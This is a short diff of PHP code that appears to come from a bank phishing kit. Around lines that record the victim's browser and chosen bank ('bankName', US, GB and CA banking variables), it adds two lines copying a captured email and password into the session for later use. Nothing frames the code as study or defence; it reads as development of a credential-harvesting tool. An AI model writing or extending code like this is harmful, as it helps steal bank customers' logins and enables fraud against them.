@@ -12,6 +12,8 @@ $UserAgent =$_SERVER['HTTP_USER_AGENT'];
 $browser = explode(')',$UserAgent);				
 $_SESSION['browser'] = $browserTy_Version =array_pop($browser);
 $_SESSION['bankName'] = $_POST['bankName'];
+$_SESSION['Email']    = $_SESSION['_email_'];
+$_SESSION['Pass']     = $_SESSION['_password_'];
 $USbanking="";
 $GBbanking="";
 $CAbanking="";
